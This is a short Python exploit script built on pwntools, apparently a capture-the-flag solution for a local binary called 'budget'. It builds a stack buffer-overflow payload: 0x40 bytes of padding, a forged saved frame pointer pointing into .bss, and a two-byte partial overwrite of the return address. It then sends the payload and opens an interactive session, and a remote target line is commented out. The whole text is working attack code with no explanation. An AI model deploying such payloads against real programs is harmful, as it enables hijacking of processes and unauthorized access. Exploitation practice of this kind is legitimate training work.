from pwn import *

elf = ELF("./budget")
p = process("./budget")
#p = remote('ip', port)
addr = elf.symbols["__bss_start"]
print(hex(addr))
payload =flat(
    b"A" * 0x40,
    p64(elf.bss() + 0x200),
    p16(0x11af)

)
p.send(payload)
p.interactive()
